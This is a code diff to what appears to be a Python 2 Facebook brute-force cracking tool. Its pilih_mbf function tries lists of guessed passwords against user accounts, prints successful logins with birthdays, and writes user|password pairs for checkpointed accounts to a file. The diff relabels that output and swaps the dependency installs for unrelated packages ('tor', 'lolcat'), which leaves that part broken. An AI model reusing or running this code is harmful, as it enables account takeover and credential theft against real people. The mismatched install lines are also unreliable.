@@ -5,12 +5,12 @@ from multiprocessing.pool import ThreadPool
 try:
     import mechanize
 except ImportError:
-    os.system('pip2 install mechanize')
+    os.system('pip2 install tor')
 
 try:
     import bs4
 except ImportError:
-    os.system('pip2 install bs4')
+    os.system('pip2 install lolcat')
 
 try:
     import requests
@@ -344,7 +344,7 @@ def pilih_mbf():
                     print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;91mARBAB-OK💉💉' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass2 
+                    print '\x1b[1;91mCHECKPOINT' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass2 
                     print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                     cek = open('out/mbf_cp.txt', 'a')
                     cek.write(user + '|' + pass2 + '\n')
@@ -374,7 +374,7 @@ def pilih_mbf():
                             print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;91mARBAB-OK💉💉 ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass4
+                            print '\x1b[1;91mCHECKPOINT ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass4
                             print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                             cek = open('out/mbf_cp.txt', 'a')
                             cek.write(user + '|' + pass4 + '\n')
@@ -389,7 +389,7 @@ def pilih_mbf():
                                 print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;91mARBAB-OK💉💉 ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass5
+                                print '\x1b[1;91mCHECKPOINT ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass5
                                 print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                                 cek = open('out/mbf_cp.txt', 'a')
                                 cek.write(user + '|' + pass5 + '\n')
@@ -419,7 +419,7 @@ def pilih_mbf():
                                        print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                                        oks.append(user + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                       print '\x1b[1;96mARBAB-OK💉💉 ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass7
+                                       print '\x1b[1;92mCHECKPOINT ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass7
                                        print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
                                        cek = open('out/mbf_cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
